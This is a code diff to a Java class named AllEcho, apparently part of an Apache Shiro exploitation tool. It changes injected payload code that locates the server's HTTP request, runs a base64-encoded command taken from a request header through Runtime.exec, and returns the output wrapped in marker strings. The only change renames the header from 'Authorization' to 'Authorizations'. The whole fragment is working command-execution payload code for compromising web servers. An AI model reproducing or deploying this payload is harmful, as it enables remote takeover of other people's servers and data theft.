@@ -35,7 +35,7 @@ public class AllEcho implements EchoPayload {
                 "        if(!i(o)){\n" +
                 "            if(r ==null&&javax.servlet.http.HttpServletRequest.class.isAssignableFrom(o.getClass())){\n" +
                 "                r = (javax.servlet.http.HttpServletRequest)o;\n" +
-                "                if(r.getHeader(\"Host\")==null && r.getHeader(\"Authorization\") == null) {\n" +
+                "                if(r.getHeader(\"Host\")==null && r.getHeader(\"Authorizations\") == null) {\n" +
                 "                    r = null;\n" +
                 "                }else{\n" +
                 "                    try {\n" +
@@ -52,7 +52,7 @@ public class AllEcho implements EchoPayload {
                 "                    \n" +
                 "                    p.addHeader(\"Host\",r.getHeader(\"Host\"));\n" +
                 "                    try {\n" +
-                "                        p.getWriter().println(\"BrY3jhHrh6\" +  org.apache.shiro.codec.Base64.encodeToString(new java.util.Scanner(Runtime.getRuntime().exec(org.apache.shiro.codec.Base64.decodeToString(r.getHeader(\"Authorization\").replaceAll(\"Basic \",\"\"))).getInputStream()).useDelimiter(\"\\\\A\").next().getBytes()) + \"yQqlMgS1cL\");\n" +
+                "                        p.getWriter().println(\"BrY3jhHrh6\" +  org.apache.shiro.codec.Base64.encodeToString(new java.util.Scanner(Runtime.getRuntime().exec(org.apache.shiro.codec.Base64.decodeToString(r.getHeader(\"Authorizations\").replaceAll(\"Basic \",\"\"))).getInputStream()).useDelimiter(\"\\\\A\").next().getBytes()) + \"yQqlMgS1cL\");\n" +
                 "                    }catch (Exception e){}\n" +
                 "                   \n" +
                 "                    p.getWriter().flush();\n" +
